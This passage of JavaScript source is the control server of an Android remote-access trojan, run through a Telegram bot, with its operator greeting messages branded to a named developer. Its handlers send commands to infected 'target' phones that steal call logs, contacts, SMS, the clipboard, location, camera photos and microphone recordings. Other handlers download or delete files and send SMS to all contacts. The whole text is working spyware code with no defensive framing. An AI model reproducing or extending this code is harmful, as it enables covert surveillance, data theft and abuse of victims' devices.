                    '°• 𝐍𝐎 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐈𝐍𝐆 📱💻🧑‍💻𝐃𝐄𝐕𝐈𝐂𝐄𝐒 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐑𝐈𝐆𝐇𝐓 𝐍𝐎𝐖 ⏳ 𝐓𝐑𝐘 𝐀𝐆𝐀𝐈𝐍 𝐋𝐀𝐓𝐄𝐑𝐑𝐑...!\n\n' +
                    '• 𝗠𝗔𝗞𝗘 𝗦𝗨𝗥𝗘 𝗧𝗛𝗘 𝗔𝗣𝗣𝗟𝗜𝗖𝗔𝗧𝗜𝗢𝗡 , 𝗪𝗛𝗜𝗖𝗛 𝗜𝗦 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗗 𝗕𝗬 𝗠𝗥.𝗖𝗛𝗔𝗜𝗧𝗔𝗡𝗬𝗔 𝗞𝗨𝗟𝗞𝗔𝗥𝗡𝗜 𝗦𝗜𝗥 🚨𝗜𝗦 𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗘𝗗 𝗢𝗡 𝗧𝗛𝗘 𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗘𝗩𝗜𝗖𝗘'
                )
            } else {
                let text = '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐇𝐄𝐑𝐄 𝐀𝐑𝐄 𝐓𝐇𝐄 𝐋𝐈𝐒𝐓 📃🧩𝐎𝐅 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒:\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ 📱: <b>${value.model}</b>\n` +
                    `• ʙᴀᴛᴛᴇʀʏ 🔋: <b>${value.battery}</b>\n` +
                    `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ ❄️: <b>${value.version}</b>\n` +
                    `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ ☀️: <b>${value.brightness}</b>\n` +
                    `• ᴘʀᴏᴠɪᴅᴇʀ  📶: <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == '𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• 𝐍𝐎 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐈𝐍𝐆 📱💻🧑‍💻𝐃𝐄𝐕𝐈𝐂𝐄𝐒 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐑𝐈𝐆𝐇𝐓 𝐍𝐎𝐖 ⏳ 𝐓𝐑𝐘 𝐀𝐆𝐀𝐈𝐍 𝐋𝐀𝐓𝐄𝐑𝐑𝐑...!\n\n' +
                    '• 𝗠𝗔𝗞𝗘 𝗦𝗨𝗥𝗘 𝗧𝗛𝗘 𝗔𝗣𝗣𝗟𝗜𝗖𝗔𝗧𝗜𝗢𝗡 , 𝗪𝗛𝗜𝗖𝗛 𝗜𝗦 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗗 𝗕𝗬 𝗠𝗥.𝗖𝗛𝗔𝗜𝗧𝗔𝗡𝗬𝗔 𝗞𝗨𝗟𝗞𝗔𝗥𝗡𝗜 𝗦𝗜𝗥 🚨𝗜𝗦 𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗘𝗗 𝗢𝗡 𝗧𝗛𝗘 𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗘𝗩𝗜𝗖𝗘'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• 𝐒𝐄𝐋𝐄𝐂𝐓 𝐃𝐄𝐕𝐈𝐂𝐄 👉🤡👈 𝐓𝐎 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐄𝐍𝐃', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• 𝑪𝑯𝑨𝑰𝑻𝑨𝑵𝒀𝑨 𝑷𝑳𝑬𝑨𝑺𝑬 🤖 𝑺𝑬𝑳𝑬𝑪𝑻 𝑪𝑶𝑴𝑴𝑬𝑵𝑫 𝑭𝑶𝑹 💻🧑‍💻📱𝑫𝑬𝑽𝑰𝑪𝑬 👉: <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '𝘼𝙥𝙥𝙨 📱', callback_data: `apps:${uuid}`},
                        {text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤 💻', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '𝙂𝙚𝙩 𝙛𝙞𝙡𝙚 📁', callback_data: `file:${uuid}`},
                        {text: '𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚 ❌', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙 🥶', callback_data: `clipboard:${uuid}`},
                        {text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 🎙️', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 📸', callback_data: `camera_main:${uuid}`},
                        {text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 📷', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 🚂', callback_data: `location:${uuid}`},
                        {text: '𝙏𝙤𝙖𝙨𝙩 🔔', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '𝘾𝙖𝙡𝙡𝙨 📞', callback_data: `calls:${uuid}`},
                        {text: '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨 🎛️', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚 📳', callback_data: `vibrate:${uuid}`},
                        {text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣 🔔', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨 😈', callback_data: `messages:${uuid}`},
                        {text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 😎', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤 🎵', callback_data: `play_audio:${uuid}`},
                        {text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤 🎼', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨 🤩',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
            '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
            '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
            '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
            '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
            '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
            '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
            '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
            '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
            '• ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
            '• ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
            '• ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n' +
            '• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
